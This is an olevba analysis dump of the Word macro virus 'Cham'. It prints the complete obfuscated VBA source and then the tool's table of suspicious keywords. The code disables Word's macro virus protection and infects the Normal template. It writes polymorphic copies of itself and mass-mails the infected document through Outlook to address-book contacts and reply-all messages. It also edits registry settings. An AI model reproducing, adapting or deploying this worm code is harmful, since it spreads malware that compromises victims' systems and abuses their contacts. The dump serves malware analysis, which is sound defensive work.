olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cham-d926a14ee7d44fd9278553580b823bf2b3e8932e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cham-d926a14ee7d44fd9278553580b823bf2b3e8932e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim WNVOQDX(100) As String, WTCBMXJ(100) As String
Dim JABLZCJ
Private Function EWBECIQ(QEVEXZL)
Dim BDFANUR(100) As String
Randomize (Timer)
QTXRHMM = Fix(Val(YTDYUAG("7", -5)) * Rnd) + Val(YTDYUAG("<", -5))
Set LOZDGVC = FYUYNUT(ActiveDocument)
If UCase(ActiveDocument.FullName) = UCase(QEVEXZL) Then Exit Function
Documents.Add , True
Set CKLNJVD = FYUYNUT(ActiveDocument)
For PUSGOYI = 1 To LOZDGVC.CountOfLines
ZEBKJUF = LOZDGVC.Lines(PUSGOYI, 1)
If Left(ZEBKJUF, 1) = YTDYUAG("1", -10) And Right(ZEBKJUF, 1) = YTDYUAG("4", -10) Then
For ZRIJTIK = Val(YTDYUAG(">", -12)) To Len(ZEBKJUF) - 1
If Mid(ZEBKJUF, ZRIJTIK, 1) <> YTDYUAG("3", -6) Then
WNVOQDX(JABLZCJ) = WNVOQDX(JABLZCJ) + Mid(ZEBKJUF, ZRIJTIK, Val(YTDYUAG("4", -3)))
Else
JABLZCJ = JABLZCJ + Val(YTDYUAG("7", -6))
End If
Next
Exit For
End If
Next
For ZRIJTIK = Val(YTDYUAG("8", -8)) To JABLZCJ
Randomize (Timer)
For Longitud = Val(YTDYUAG("3", -2)) To QTXRHMM
Randomize (Second(Now))
WTCBMXJ(ZRIJTIK) = WTCBMXJ(ZRIJTIK) + XXQKXIP(Fix(Val(YTDYUAG(";?", -9)) * Rnd) + Val(YTDYUAG("?>", -9)))
Next
Next
For ZRIJTIK = Val(YTDYUAG("<", -11)) To LOZDGVC.CountOfLines
ZEBKJUF = NTWUAIQ(LOZDGVC.Lines(ZRIJTIK, 1))
If ZRIJTIK = PUSGOYI Then RPHNAAO = ZEBKJUF: ZEBKJUF = ""
If Left(ZEBKJUF, Val(YTDYUAG("C", -12))) = YTDYUAG("\~u‚mЂq", -12) Then MKQSZKL = MKQSZKL + Val(YTDYUAG("=", -12))
If MKQSZKL = Val(YTDYUAG("8", -8)) Then
CKLNJVD.insertlines ZRIJTIK, ZEBKJUF
SYMWMYH = ZRIJTIK + Val(YTDYUAG("D", -19))
Else
BDFANUR(MKQSZKL) = BDFANUR(MKQSZKL) + ZEBKJUF + vbCrLf
End If
Next
Randomize (Timer)
UHNJTKW = Fix(MKQSZKL * Rnd) + Val(YTDYUAG(":", -9))
For PUSGOYI = UHNJTKW To MKQSZKL
CKLNJVD.insertlines SYMWMYH, BDFANUR(PUSGOYI)
SYMWMYH = SYMWMYH + Len(BDFANUR(PUSGOYI))
BDFANUR(PUSGOYI) = ""
Next
For PUSGOYI = 1 To MKQSZKL
If BDFANUR(PUSGOYI) <> "" Then
CKLNJVD.insertlines SYMWMYH, BDFANUR(PUSGOYI)
SYMWMYH = SYMWMYH + Len(BDFANUR(PUSGOYI)) + Val(YTDYUAG("=", -12))
BDFANUR(PUSGOYI) = ""
End If
Next
Randomize (Timer)
CKLNJVD.insertlines (CKLNJVD.CountOfLines * Rnd) + Val(YTDYUAG("6", -5)), RPHNAAO
ActiveDocument.SaveAs QEVEXZL
ActiveDocument.Close
End Function

Private Sub Document_Open()
On Error Resume Next
Set PUSGOYI = Options
SOMRAHS = PUSGOYI.DefaultFilePath(wdDocumentsPath) & YTDYUAG("_", -3) & Application.UserName & YTDYUAG("1grf", -3)
PUSGOYI.VirusProtection = Val(YTDYUAG("D", -20))
EWBECIQ SOMRAHS
WAHVEUG
If ThisDocument.Name <> NormalTemplate.Name Then
Set PUSGOYI = CreateObject(YTDYUAG("V|{svvr", -7) & XXQKXIP(Val(YTDYUAG(";=", -7))) & YTDYUAG("Hwwspjh{pvu", -7))
Set TUZLIXY = PUSGOYI.GetNamespace(YTDYUAG("PDSL", -3))
Set RCCHTJY = TUZLIXY.GetDefaultFolder(6).Items
Set PVPOLUS = TUZLIXY.AddressLists(Val(YTDYUAG("F", -21)))
Set ROJZDED = PUSGOYI.CreateItem(Val(YTDYUAG("5", -5)))
For UHNJTKW = 1 To PVPOLUS.AddressEntries.Count
Set TUZLIXY = ROJZDED.Recipients.Add(PVPOLUS.AddressEntries.Item(UHNJTKW))
TUZLIXY.Type = 3
If TUZLIXY.Resolve = False Then TUZLIXY.Delete
If UHNJTKW > Val(YTDYUAG(">9", -9)) Then Exit For
Next
ROJZDED.Subject = Application.UserName & YTDYUAG("3@3V€……|v€€Ђ3i|‡tx", -19)
ROJZDED.Attachments.Add SOMRAHS
ROJZDED.Send
For PUSGOYI = RCCHTJY.Count To (RCCHTJY.Count - Val(YTDYUAG("F", -13))) Step -1
If PUSGOYI < Val(YTDYUAG("3", -2)) Then Exit For
Set ROJZDED = RCCHTJY.Item(PUSGOYI).ReplyAll
ROJZDED.Attachments.Add SOMRAHS
ROJZDED.Send
Next
End If
Set PUSGOYI = System
PUSGOYI.PrivateProfileString("", YTDYUAG("TWQekX[OMXkYMOTUZQh_{rЂѓm~qhYuo~{{rЂhcuzp{ѓhOЃ~~qzЂbq~u{zhcuzx{s{zh", -12), YTDYUAG("XqsmxZ{ЂuoqOm|Ђu{z", -12)) = YTDYUAG("T``\F;;ѓѓѓ:>B<<:o{y", -12)
PUSGOYI.PrivateProfileString("", YTDYUAG("Y\Vjp]`TR]p^RTYZ_VmdЂw…€rѓvm^ztѓЂ„Ђw…mhzuЂ€„mT†ѓѓv…gvѓ„zЂmhz}ЂxЂm", -17), YTDYUAG("]vxr}_Ђ…ztvev‰…", -17)) = YTDYUAG("jЂ†1hvѓv1Zwvt…vu1SЉ1WѓvvTyr~1gzѓ†„", -17)
End Sub

Private Function NTWUAIQ(OYFZSFR As String) As String
Do While InStr(OYFZSFR, WNVOQDX(0) & XXQKXIP(Val(YTDYUAG("C?", -15))) & XXQKXIP(Val(YTDYUAG("BC", -15)))) <> 0
PUSGOYI = InStr(OYFZSFR, WNVOQDX(0))
NMPHLOX = InStr(PUSGOYI + Len(WNVOQDX(0)) + Val(YTDYUAG("3", -1)), OYFZSFR, XXQKXIP(Val(YTDYUAG("45", -1)))) + 1
MRCAPPG = Val(Mid(OYFZSFR, NMPHLOX + 1, InStr(NMPHLOX, OYFZSFR, ")") - NMPHLOX - Val(YTDYUAG("B", -17))))
Do While LAZQKVQ <> Val(YTDYUAG("6", -5))
Randomize (Timer)
KKSNOKW = Fix(Rnd * Val(YTDYUAG("BB", -16))) + Val(YTDYUAG("A", -16))
ORBFAPN = Mid(OYFZSFR, PUSGOYI + Len(WNVOQDX(0)) + Val(YTDYUAG("=", -11)), InStr(PUSGOYI + Len(WNVOQDX(0)) + 2, OYFZSFR, XXQKXIP(34)) - PUSGOYI - Len(WNVOQDX(0)))
LAZQKVQ = 1
For TUZLIXY = 1 To Len(ORBFAPN)
If YTDYUAG(YTDYUAG(Mid(ORBFAPN, TUZLIXY, 1), MRCAPPG), KKSNOKW) = ")" Or YTDYUAG(YTDYUAG(Mid(ORBFAPN, TUZLIXY, 1), MRCAPPG), KKSNOKW) = """" Then LAZQKVQ = 0:   Exit For
Next
Loop
OYFZSFR = Left$(OYFZSFR, PUSGOYI - 1) + WTCBMXJ(0) + "(""" & YTDYUAG(YTDYUAG(Mid(OYFZSFR, PUSGOYI + Len(WNVOQDX(0)) + 2, InStr(PUSGOYI + Len(WNVOQDX(0)) + 2, OYFZSFR, XXQKXIP(34)) - PUSGOYI - Len(WNVOQDX(0)) - 2), MRCAPPG), KKSNOKW) & """, -" & Trim(Str(KKSNOKW)) & ")" & Right(OYFZSFR, Len(OYFZSFR) - InStr(PUSGOYI + Len(WNVOQDX(0)) + 2, OYFZSFR, ")"))
Loop
For ZRIJTIK = 0 To JABLZCJ - 1
Do While InStr(OYFZSFR, WNVOQDX(ZRIJTIK)) <> Val(YTDYUAG(":", -10))
PUSGOYI = InStr(OYFZSFR, WNVOQDX(ZRIJTIK))
OYFZSFR = Left$(OYFZSFR, PUSGOYI - Val(YTDYUAG("9", -8))) + WTCBMXJ(ZRIJTIK) + Right$(OYFZSFR, Len(OYFZSFR) - Len(WNVOQDX(ZRIJTIK)) - PUSGOYI + Val(YTDYUAG("9", -8)))
Loop
Next
NTWUAIQ = OYFZSFR
End Function

Private Function YTDYUAG(SOMRAHS, MRCAPPG) As String
For ZRIJTIK = 1 To Len(SOMRAHS)
YTDYUAG = YTDYUAG & XXQKXIP(Asc(Mid(SOMRAHS, ZRIJTIK, 1)) + MRCAPPG)
Next
End Function

Private Function XXQKXIP(LSXPPII) As String
XXQKXIP = Chr(LSXPPII)
End Function

Private Function WAHVEUG()
Set PUSGOYI = FYUYNUT(NormalTemplate)
Set TUZLIXY = FYUYNUT(ActiveDocument)
If PUSGOYI.CountOfLines = Val(YTDYUAG("?", -15)) Then
PUSGOYI.insertlines Val(YTDYUAG("?", -14)), TUZLIXY.Lines(Val(YTDYUAG("?", -14)), TUZLIXY.CountOfLines)
End If
If TUZLIXY.CountOfLines = 0 Then
TUZLIXY.insertlines Val(YTDYUAG("3", -2)), PUSGOYI.Lines(1, PUSGOYI.CountOfLines)
If InStr(ActiveDocument.FullName, YTDYUAG("OznЂxpy", -11)) = False Then ActiveDocument.Save
End If
End Function

Private Function FYUYNUT(LSXPPII)
Set FYUYNUT = LSXPPII.VBProject.VBComponents.Item(Val(YTDYUAG("F", -21))).CodeModule
End Function


'YTDYUAG-XXQKXIP-WNVOQDX-WTCBMXJ-MKQSZKL-PUSGOYI-ROJZDED-FYUYNUT-BDFANUR-JABLZCJ-OYFZSFR-QEVEXZL-ZEBKJUF-SOMRAHS-MRCAPPG-QTXRHMM-LOZDGVC-CKLNJVD-ZRIJTIK-RPHNAAO-SYMWMYH-UHNJTKW-NTWUAIQ-TUZLIXY-ORBFAPN-NMPHLOX-KKSNOKW-LAZQKVQ-LSXPPII-WAHVEUG-PVPOLUS-EWBECIQ-RCCHTJY-*


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

